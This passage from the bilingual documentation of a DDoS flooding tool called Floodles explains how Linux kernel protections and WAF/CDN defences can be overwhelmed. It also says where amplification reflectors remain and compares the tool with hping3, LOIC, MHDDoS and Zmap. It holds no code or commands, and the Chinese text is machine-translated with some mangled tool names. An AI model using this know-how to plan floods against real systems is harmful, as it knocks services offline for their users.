| Fragment reassembly limits | IP frag flood | `net.ipv4.ipfrag_high_thresh` |
| 片段重组限制 | IP 分片泛滥 | `net.ipv4.ipfrag_high_thresh` |
| RP filter | Spoofed-source traffic processing | `net.ipv4.conf.all.rp_filter` |
| 反相过滤器 | 伪造源地址流量处理 | `net.ipv4.conf.all.rp_filter` |
| conntrack max | Connection table exhaustion | `net.netfilter.nf_conntrack_max` |
| 最大连接跟踪 | 连接表耗尽 | `net.netfilter.nf_conntrack_max` |

A properly hardened modern Linux server resists most L3/L4 vectors in isolation. The audit value shifts to: measuring the degradation threshold, verifying the protections are actually configured, and testing whether the upstream network (firewall, anti-DDoS appliance) provides an additional layer.
适当强化的现代 Linux 服务器可以单独抵抗大多数 L3/L4 向量。审核值转变为：测量降级阈值、验证保护措施是否实际配置以及测试上游网络（防火墙、防 DDoS 设备）是否提供附加层。

#### These Protections Can Be Overcome — Here Is How
#### 这些保护措施是可以克服的——方法如下

Each protection has a ceiling or a structural weakness:
每种保护都有上限或结构性弱点：

**SYN cookies** — reduces TCB exhaustion to zero, but does not eliminate CPU load. The server still generates one SYN-ACK per SYN received. At high enough PPS (several million/second on a 10 Gbps link), the CPU cost of computing cookie hashes and sending SYN-ACKs can itself saturate the server. Additionally, SYN cookies have side effects: TCP options (SACK, window scaling, timestamps) cannot be negotiated for cookie-validated connections, degrading throughput for all connections established during the flood.
**SYN cookies** — 将 TCB 消耗减少到零，但不会消除 CPU 负载。服务器仍然为每个收到的 SYN 生成一个 SYN-ACK。在足够高的 PPS（10 Gbps 链路上每秒几百万）下，计算 cookie 哈希值和发送 SYN-ACK 的 CPU 成本本身就会使服务器饱和。此外，SYN cookie 也有副作用：无法为 cookie 验证的连接协商 TCP 选项（SACK、窗口缩放、时间戳），从而降低了泛洪期间建立的所有连接的吞吐量。

**ICMP rate limiting** — limits outbound ICMP replies, but does not reduce inbound bandwidth consumption. The NIC must still receive, process, and discard every incoming ICMP packet. A volumetric ICMP flood saturates the upstream link regardless of the server's rate limit setting.
**ICMP rate limiting** — 限制出站 ICMP 回复，但不会减少入站带宽消耗。 NIC 仍必须接收、处理并丢弃每个传入的 ICMP 数据包。无论服务器的速率限制设置如何，大量 ICMP 泛洪都会使上游链路饱和。

**RP filter (Reverse Path Filter)** — mode 1 (loose) only drops packets whose source IP has no route in the routing table. A spoofed source IP from a publicly routable range (e.g., 8.8.8.0/24) passes mode 1. Only mode 2 (strict) drops packets that arrive on an interface other than the expected return path — but mode 2 breaks asymmetric routing and is rarely enabled in production.
**RP filter (Reverse Path Filter)** — 模式 1（宽松）仅丢弃源 IP 在路由表中没有路由的数据包。来自公共可路由范围（例如 8.8.8.0/24）的伪造源地址 IP 通过模式 1。只有模式 2（严格）会丢弃到达预期返回路径以外的接口的数据包 - 但模式 2 会破坏非对称路由，并且很少在生产中启用。

**Fragment reassembly limits** — `ipfrag_high_thresh` is the memory ceiling for pending reassemblies. Increasing this value raises the memory cost of the attack but does not prevent it — a sufficiently large fragment flood always reaches any finite threshold.
**Fragment reassembly limits** — `ipfrag_high_thresh` 是待处理重新组装的内存上限。增加该值会增加攻击的内存成本，但并不能阻止攻击——足够大的碎片泛洪总是会达到任何有限的阈值。

**conntrack max** — even when conntrack has capacity, the lookup cost per packet (hash table traversal) adds measurable latency at very high PPS. An ACK flood at 1M PPS forces 1 million conntrack lookups per second, adding CPU pressure even if no connections are dropped.
**conntrack max** — 即使 conntrack 有容量，每个数据包的查找成本（哈希表遍历）也会在非常高的 PPS 下增加可测量的延迟。 1M PPS 的 ACK 泛洪迫使每秒进行 100 万次 conntrack 查找，即使没有连接丢失，也会增加 CPU 压力。

In short: these protections raise the cost of attack but do not make a server immune. The specific PPS threshold at which each protection fails is exactly what a DoS audit measures.
简而言之：这些保护措施增加了攻击成本，但并不能使服务器免受攻击。每个保护失败的特定 PPS 阈值正是 DoS 审核所测量的。

### 13.5 Layer 7 Detection by WAF and CDN
### 13.5 WAF和CDN的七层检测

HTTP flood, Slowloris, and Slow POST are well-documented patterns. WAFs (Cloudflare, AWS WAF, ModSecurity + OWASP CRS) carry signatures for all three. Common detection and mitigation methods:
HTTP 泛洪、Slowloris 和 Slow POST 都是有据可查的模式。 WAF（Cloudflare、AWS WAF、ModSecurity + OWASP CRS）携带这三者的签名。常见的检测和缓解方法：

- **Request rate limiting**: block or challenge IPs exceeding N requests per second
- **Request rate limiting**：阻止或质询每秒超过 N 个请求的 IP
- **Minimum request rate**: close connections that take more than T seconds to send headers (mitigates Slowloris)
- **Minimum request rate**：关闭需要超过 T 秒才能发送标头的连接（缓解 Slowloris）
- **Minimum body upload rate**: close POST connections sending less than N bytes/sec (mitigates RUDY)
- **Minimum body upload rate**：关闭发送少于 N 个字节/秒的 POST 连接（缓解 RUDY）
- **TLS fingerprinting (JA3)**: fingerprint the TLS client hello to identify tool-generated traffic
- **TLS fingerprinting (JA3)**：对 TLS 客户端 hello 进行指纹识别以识别工具生成的流量
- **Behavioral analysis**: flag connections that open and hold without sending complete requests
- **Behavioral analysis**：标记打开并保持但未发送完整请求的连接

The Go HTTP engine rotates User-Agent strings but does not rotate TLS fingerprints. Against a CDN with JA3 fingerprinting, the flood may be rate-limited within seconds of detection.
Go HTTP 引擎会轮换 User-Agent 字符串，但不会轮换 TLS 指纹。针对具有 JA3 指纹识别的 CDN，泛洪可能会在检测后几秒内受到速率限制。

### 13.6 Amplification Requires Vulnerable Third-Party Infrastructure
### 13.6 放大需要存在漏洞的第三方基础设施

Finding open reflectors (SNMP `public` community, NTP monlist, open DNS resolvers) on the public internet has become progressively harder over the past decade. Most major cloud providers and ISPs have patched or firewalled these services. The attack surface today is primarily:
在过去的十年中，在公共互联网上寻找开放反射器（SNMP `public` 社区、NTP monlist、开放 DNS 解析器）变得越来越困难。大多数主要云提供商和 ISP 都对这些服务进行了修补或安装了防火墙。今天的攻击面主要是：

- Corporate internal networks with legacy equipment (printers, switches, UPS, old NTP servers)
- 具有旧设备（打印机、交换机、UPS、旧 NTP 服务器）的公司内部网络
- Industrial/OT networks with firmware that has not been updated since deployment
- 工业/OT 网络的固件自部署以来尚未更新
- Small organizations without a dedicated network security function
- 没有专用网络安全功能的小型组织

This is exactly the scope of an internal network penetration test — which is the primary intended use case for these modules.
这正是内部网络渗透测试的范围——这是这些模块的主要预期用例。

---

## 14. Related Work
## 14. 相关工作

### 14.1 Comparison
### 14.1 比较

| Tool | Language | L3/L4 | L7 | Amplification | Spoofing | Multi-vector | Backends |
| 工具 | 语言 | L3/L4 | L7 | 放大 | 源地址伪造 | 多向量 | 后端 |
|------|----------|--------|-----|--------------|---------|-------------|---------|
| **Floodles** | Python/C/Rust/Go | Yes | Yes | Yes | Yes | Yes (SPRAY) | 4 |
| **Floodles** | Python/C/Rust/Go | 是 | 是 | 是 | 是 | 是（喷雾） | 4 |
| hping3 | C | Yes | No | No | Yes | No | 1 |
| hping3 | C | 是 | 不 | 不 | 是 | 不 | 1 |
| LOIC | C# / Java | Partial | Yes | No | No | No | 1 |
| 洛伊克 | C# / Java | 部分的 | 是 | 不 | 不 | 不 | 1 |
| Scapy | Python | Yes | Partial | Manual | Yes | Manual | 1 |
| 斯卡皮 | Python | 是 | 部分的 | 手动的 | 是 | 手动的 | 1 |
| MHDDoS | Python | Yes | Yes | Partial | Yes | Partial | 1 |
| 多态性拒绝服务 | Python | 是 | 是 | 部分的 | 是 | 部分的 | 1 |
| Zmap | C | Partial | No | No | Yes | No | 1 |
| Z图 | C | 部分的 | 不 | 不 | 是 | 不 | 1 |
| Masscan | C | Partial | No | No | No | No | 1 |
| 马斯坎 | C | 部分的 | 不 | 不 | 不 | 不 | 1 |
| ab / wrk | C | No | Yes | No | No | No | 1 |
| ab/wrk | C | 不 | 是 | 不 | 不 | 不 | 1 |

### 14.2 hping3

hping3 (Salvo Sanfilippo, 1998-2005) is the reference raw packet tool. It constructs packets with full header control, supports IP spoofing and TCP flag manipulation, and is excellent for crafting specific sequences or testing individual packet behaviors. Its limitation is throughput: it is single-threaded and processes one `sendto()` call per packet, capping at approximately 80,000-100,000 PPS on modern hardware. No batch sending, no multi-threaded flood mode, no L7 or amplification modules. Floodles' C backend achieves 10x+ the PPS of hping3 in flood mode via `sendmmsg()` batching.
hping3（Salvo Sanfilippo，1998-2005）是参考原始数据包工具。它构建具有完整标头控制的数据包，支持 IP 源地址伪造和 TCP 标志操作，并且非常适合制作特定序列或测试单个数据包行为。它的限制是吞吐量：它是单线程的，每个数据包处理一个 `sendto()` 调用，在现代硬件上上限约为 80,000-100,000 PPS。没有批量发送，没有多线程泛洪模式，没有L7或放大模块。 Floodles 的 C 后端通过 `sendmmsg()` 批处理在泛洪模式下实现了 hping3 10 倍以上的 PPS。

### 14.3 LOIC (Low Orbit Ion Cannon)
### 14.3 LOIC（低轨道离子炮）

LOIC (Praetox Technologies, 2010) introduced the concept of voluntary DDoS coordination via an IRC "hivemind" mode — users pointed their instances at the same target on command. It operates at L7 (HTTP flood) and L4 (UDP/TCP without raw sockets). It does not support IP spoofing, raw socket packet construction, or amplification. Its design goal was mass voluntary participation, not maximum single-node throughput. The hivemind model is its distinguishing architectural feature; Floodles has no equivalent (each instance runs independently).
LOIC（Praetox Technologies，2010）通过 IRC“hivemind”模式引入了自愿 DDoS 协调的概念 - 用户根据命令将其实例指向同一目标。它在 L7（HTTP 泛洪）和 L4（没有原始套接字的 UDP/TCP）上运行。它不支持 IP 源地址伪造、原始套接字数据包构造或放大。它的设计目标是大众自愿参与，而不是最大单节点吞吐量。 hivemind 模型是其显着的架构特征； Floodles 没有等效项（每个实例独立运行）。

### 14.4 Scapy
### 14.4 斯卡比

Scapy (Philippe Biondi, 2003) is the reference Python library for arbitrary packet construction. It supports every standard protocol and allows full header manipulation at any layer. It is the gold standard for protocol research, fuzzing, and interactive packet crafting. Its throughput ceiling is approximately 12,000-15,000 PPS — Python processes one packet at a time through interpreted loops, with one `sendto()` syscall per packet. Floodles uses Scapy as a fallback when no native backend is available, and as the packet-inspection component in some modules. For flood operations, the C backend provides 100x+ improvement.
Scapy（Philippe Biondi，2003）是用于任意数据包构建的参考 Python 库。它支持每个标准协议，并允许在任何层进行完整的标头操作。它是协议研究、模糊测试和交互式数据包制作的黄金标准。其吞吐量上限约为 12,000-15,000 PPS — Python 通过解释循环一次处理一个数据包，每个数据包有一个 `sendto()` 系统调用。当没有可用的原生后端时，Floodles 使用 Scapy 作为后备，并作为某些模块中的数据包检查组件。对于泛洪操作，C 后端提供了 100 倍以上的改进。

### 14.5 MHDDoS

MHDDoS (Matrix) is a Python DDoS toolkit covering both L4 and L7 with proxy support, making it the closest functional analog to Floodles. Key differences: MHDDoS does not use native compiled backends (lower L4 throughput), supports proxy rotation for L7 anonymization (Floodles does not), and does not implement IP fragmentation or amplification modules. MHDDoS is oriented toward distributed proxy-based operation; Floodles is oriented toward maximum raw performance from a single node with native backends.
MHDDoS (Matrix) 是一个 Python DDoS 工具包，涵盖 L4 和 L7，并具有代理支持，使其成为与 Floodles 最接近的功能模拟。主要区别：MHDDoS 不使用本机编译的后端（较低的 L4 吞吐量），支持 L7 匿名化的代理轮换（Floodles 不支持），并且不实现 IP 分段或放大模块。 MHDDoS面向分布式基于代理的操作； Floodles 面向具有原生后端的单个节点的最大原始性能。

### 14.6 Zmap and Masscan
### 14.6 Zmap和Masscan

Zmap (Durumeric et al., USENIX Security 2013) and Masscan (Robert Graham, 2013) are internet-scale stateless TCP SYN scanners. They use the same raw socket approach as Floodles' C backend and can achieve similar PPS rates. Their purpose is host discovery (send one SYN per target, record which respond), not sustained flooding against a single target. They have no L7 modules, no amplification, no sustained flood mode. They inform Floodles scan reconnaissance but are architecturally distinct.
Zmap（Durumeric 等人，USENIX Security 2013）和 Masscan（Robert Graham，2013）是互联网规模的无状态 TCP SYN 扫描器。它们使用与 Floodles 的 C 后端相同的原始套接字方法，并且可以实现类似的 PPS 速率。它们的目的是主机发现（每个目标发送一个 SYN，记录响应），而不是针对单个目标的持续洪泛。它们没有 L7 模块、没有放大、没有持续泛洪模式。它们负责通知 Floodles 进行扫描侦察，但在架构上却截然不同。

---

## 15. References
## 15. 参考文献

### RFCs
### RFC

- **RFC 768** (1980) — User Datagram Protocol. Postel, J. IETF.
- **RFC 768** (1980) — 用户数据报协议。 Postel，J. IETF。
- **RFC 791** (1981) — Internet Protocol. Postel, J. IETF.
- **RFC 791** (1981) — 互联网协议。 Postel，J.IETF。
- **RFC 793** (1981) — Transmission Control Protocol. Postel, J. IETF.
- **RFC 793** (1981) — 传输控制协议。 Postel，J. IETF。
- **RFC 1071** (1988) — Computing the Internet Checksum. Braden, R. et al. IETF.
- **RFC 1071** (1988) — 计算互联网校验和。布雷登，R.等人。IETF。
- **RFC 2827** (2000) — Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing (BCP38). Ferguson, P., Senie, D. IETF.
- **RFC 2827** (2000) — 网络入口过滤：击败采用 IP 源地址伪造 (BCP38) 的拒绝服务攻击。 Ferguson, P.、Senie, D. IETF。
- **RFC 4953** (2007) — Defending TCP Against Spoofing Attacks. Touch, J. IETF.
- **RFC 4953** (2007) — 防御 TCP 免受源地址伪造攻击。Touch, J. IETF。
- **RFC 5905** (2010) — Network Time Protocol Version 4: Protocol and Algorithms Specification. Mills, D. et al. IETF.
- **RFC 5905** (2010) — 网络时间协议版本 4：协议和算法规范。米尔斯，D.等人。IETF。
- **RFC 8482** (2019) — Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY. Abley, J. et al. IETF.
- **RFC 8482** (2019) — 为 QTYPE=ANY 的 DNS 查询提供最小大小的响应。艾布利，J. 等人。IETF。

### CVEs
### CVE

- **CVE-1999-0015** — Teardrop: IP fragment overlap causes kernel panic in Linux 2.0/2.1 and Windows NT 4.0/95. CVSS 5.0.
- **CVE-1999-0015** — Teardrop：IP 片段重叠会导致 Linux 2.0/2.1 和 Windows NT 4.0/95 中的内核崩溃。 CVSS 5.0。
- **CVE-2004-0230** — TCP RST injection against BGP sessions via in-window RST packet. Cisco Security Advisory 20040420. Affects virtually all TCP implementations without PAWS.
- **CVE-2004-0230** — 通过窗口内 RST 数据包针对 BGP 会话进行 TCP RST 注入。Cisco 安全公告 20040420。几乎影响所有没有 PAWS 的 TCP 实施。
- **CVE-2013-5211** — NTP monlist amplification. ntpd before 4.2.7p26 allows remote attackers to cause reflected DDoS via spoofed REQ_MON_GETLIST requests.
- **CVE-2013-5211** — NTP monlist 放大。 4.2.7p26 之前的 ntpd 允许远程攻击者通过源地址伪造的 REQ_MON_GETLIST 请求引发反射 DDoS。

### Papers and Technical Reports
### 论文和技术报告

- Mirkovic, J., Reiher, P. (2004). **A Taxonomy of DDoS Attack and DDoS Defense Mechanisms**. *ACM SIGCOMM Computer Communication Review*, 34(2), 39-53. Definitive classification framework for DoS/DDoS attacks and mitigations.
- 米尔科维奇，J.，赖尔，P. (2004)。 **A Taxonomy of DDoS Attack and DDoS Defense Mechanisms**。 *ACM SIGCOMM 计算机通信评论*，34(2), 39-53。 DoS/DDoS 攻击和缓解措施的明确分类框架。
- Paxson, V. (2001). **An Analysis of Using Reflectors for Distributed Denial-of-Service Attacks**. *ACM SIGCOMM Computer Communication Review*, 31(3), 38-47. First formal analysis of DRDoS amplification mechanics.
- 帕克森，V.（2001）。 **An Analysis of Using Reflectors for Distributed Denial-of-Service Attacks**。 *ACM SIGCOMM 计算机通信评论*，31(3), 38-47。 DRDoS 放大机制的首次正式分析。
- Durumeric, Z., Wustrow, E., Halderman, J.A. (2013). **ZMap: Fast Internet-Wide Scanning and Its Security Applications**. *Proceedings of the 22nd USENIX Security Symposium*. Documents raw socket scanning at internet scale.
- Durumeric, Z.、Wustrow, E.、Halderman, J.A. （2013）。 **ZMap: Fast Internet-Wide Scanning and Its Security Applications**。 *第 22 届 USENIX 安全研讨会论文集*。记录互联网规模的原始套接字扫描。
- Rossow, C. (2014). **Amplification Hell: Revisiting Network Protocols for DDoS Abuse**. *NDSS 2014*. Systematic measurement of amplification factors across 14 UDP protocols.
- 罗索，C.（2014）。 **Amplification Hell: Revisiting Network Protocols for DDoS Abuse**。 *NDSS 2014*。跨 14 个 UDP 协议的放大系数的系统测量。
- Gilad, Y., Herzberg, A. (2012). **Off-Path Attacking the Web**. *USENIX WOOT 2012*. Analysis of TCP RST injection and off-path attacks.
- 吉拉德，Y.，赫茨伯格，A.（2012）。 **Off-Path Attacking the Web**。 *USENIX WOOT 2012*。 TCP RST注入和偏离路径攻击分析。
- US-CERT Alert TA14-017A (2014). **UDP-Based Amplification Attacks**. Documents SNMP, NTP, DNS, and CharGen amplification factors observed during 2013-2014 attacks.
- US-CERT 警报 TA14-017A (2014)。 **UDP-Based Amplification Attacks**。记录 2013-2014 年攻击期间观察到的 SNMP、NTP、DNS 和 CharGen 放大系数。
- Cloudflare (2018). **GitHub Suffered the Biggest DDoS Attack Ever Seen**. Technical analysis of the 1.35 Tbps Memcached amplification attack (51,200x factor).
- Cloudflare (2018)。 **GitHub Suffered the Biggest DDoS Attack Ever Seen**。 1.35 Tbps Memcached 放大攻击的技术分析（51,200 倍系数）。
- Cloudflare DDoS Threat Report Q4 2023. Documents multi-vector attack trends and evolving amplification techniques in production traffic.
- Cloudflare DDoS 威胁报告 2023 年第 4 季度。记录了生产流量中的多向量攻击趋势和不断发展的放大技术。

### Kernel and Syscall Documentation
### 内核和系统调用文档

- `man 2 sendmmsg` — Linux `sendmmsg(2)` reference. Batch message sending for UDP and raw sockets.
- `man 2 sendmmsg` — Linux `sendmmsg(2)` 参考。 UDP 和原始套接字的批量消息发送。
- `man 2 socket` — `SOCK_RAW` and `IPPROTO_RAW` socket creation.
- `man 2 socket` — `SOCK_RAW` 和 `IPPROTO_RAW` 套接字创建。
- `man 7 ip` — `IP_HDRINCL` socket option, raw socket behavior.
- `man 7 ip` — `IP_HDRINCL` 套接字选项，原始套接字行为。
- Linux kernel source — `net/ipv4/tcp_input.c`: SYN queue, SYN cookie implementation.
- Linux 内核源代码 — `net/ipv4/tcp_input.c`：SYN 队列、SYN cookie 实现。
- Linux kernel source — `net/ipv4/ip_fragment.c`: fragment reassembly (`ipq` hash table, `ipfrag_high_thresh`).
- Linux 内核源代码 — `net/ipv4/ip_fragment.c`：片段重组（`ipq` 哈希表、`ipfrag_high_thresh`）。
- Linux kernel source — `net/ipv4/icmp.c`: ICMP rate limiting (`icmp_ratelimit`).
- Linux 内核源代码 — `net/ipv4/icmp.c`：ICMP 速率限制 (`icmp_ratelimit`)。
- Linux kernel source — `net/core/filter.c`: RP filter, conntrack integration.
- Linux 内核源代码 — `net/core/filter.c`：RP 过滤器、conntrack 集成。

---

*Floodles v2.0.0*
*Floodles v2.0.0*
